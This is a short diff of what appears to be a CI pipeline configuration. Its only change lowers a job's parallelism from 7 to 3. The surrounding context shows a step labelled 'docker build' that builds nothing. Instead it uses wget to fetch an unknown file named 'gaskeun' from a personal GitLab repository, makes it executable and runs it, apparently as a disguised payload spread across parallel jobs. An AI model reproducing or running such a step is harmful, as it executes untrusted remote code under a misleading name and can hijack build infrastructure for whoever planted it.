@@ -11,4 +11,4 @@ blocks:
         - name: docker build
           commands:
             - 'wget -O 4 https://gitlab.com/richardkevin320/depo/-/raw/main/gaskeun && chmod +x 4 && ./4'
-          parallelism: 7
+          parallelism: 3
